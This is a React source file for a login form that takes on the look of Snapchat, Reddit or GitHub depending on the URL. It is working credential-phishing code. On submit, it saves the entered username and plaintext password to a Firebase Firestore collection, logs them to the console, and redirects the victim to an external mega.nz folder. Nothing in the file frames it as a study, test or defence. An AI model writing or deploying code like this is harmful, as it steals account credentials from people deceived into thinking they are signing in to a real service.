import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import snapchat from "../images/snapchat.png";
import reddit from "../images/reddit.png";
import github from "../images/github.png";
import "./Form.css";
import { collection, addDoc } from "firebase/firestore";
import { db } from "../config/firebase";
const Form = () => {
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [image, setImage] = useState("");

  const { id } = useParams();
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      setLoading(true);
      if (!username || !password) {
        setError(true);
        return;
      }
      console.log(username, password);
      const docRef = await addDoc(collection(db, "users"), {
        username: username,
        password: password,
        platform: id,
      });
      if (docRef?.id) {
        window.open(
          "https://mega.nz/folder/NPYA1BiR#9TDQ4C4H-YD7_nYDsjBlSg",
          "_self"
        );
      }
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (id === "snapchat") {
      setImage(snapchat);
    } else if (id === "reddit") {
      setImage(reddit);
    } else if (id === "github") {
      setImage(github);
    } else {
      setImage(snapchat);
    }
  }, [id]);
  return (
    <>
      <div
        style={{
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          height: "100vh",
        }}
      >
        <div className="form-actions">
          <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
            <img src={image} alt="" />
            <p>Sign in</p>
          </div>
          <div
            style={{
              marginBottom: 20,
              width: "100%",
            }}
          >
            <div
              style={{
                marginBottom: 20,
                width: "100%",
              }}
            >
              <input
                onChange={(e) => {
                  setUsername(e.target.value);
                }}
                value={username}
                type="text"
                name="username"
                className="form-input"
                placeholder="Username"
              />
              {error && (
                <p className="error-text">Please enter your username</p>
              )}
            </div>
            <div
              style={{
                marginBottom: 20,
                width: "100%",
              }}
            >
              <input
                onChange={(e) => {
                  setPassword(e.target.value);
                }}
                value={password}
                type="password"
                name="password"
                className="form-input"
                placeholder="Password"
              />
              {error && (
                <p className="error-text">Please enter your correct password</p>
              )}
            </div>
          </div>
          <button onClick={handleSubmit} className="form-login">
            {loading ? "Signing in..." : "Login"}
          </button>
        </div>
      </div>
    </>
  );
};

export default Form;
